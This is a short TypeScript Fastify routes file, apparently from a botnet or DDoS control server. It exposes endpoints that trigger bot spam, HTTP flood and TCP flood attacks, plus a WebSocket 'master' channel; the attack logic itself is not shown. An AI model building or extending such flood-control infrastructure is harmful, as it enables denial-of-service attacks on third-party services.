import type {FastifyInstance} from "fastify";
import {BotController} from "../controllers/bot-controller.ts";
import {HttpFloodController} from "../controllers/http-flood-controller.ts";
import {TcpFloodController} from "../controllers/tcp-flood-controller.ts";
import {MasterWsController} from "../controllers/master-ws-controller.ts";

export async function routes(app: FastifyInstance){
    app.post("/spam-bots", BotController.spamBots);
    app.post("/http-flood", HttpFloodController.httpFloodAttack);
    app.post("/tcp-flood", TcpFloodController.tcpFloodAttack);
    app.get("/ws/:type",{websocket: true} ,MasterWsController.masterWs);
}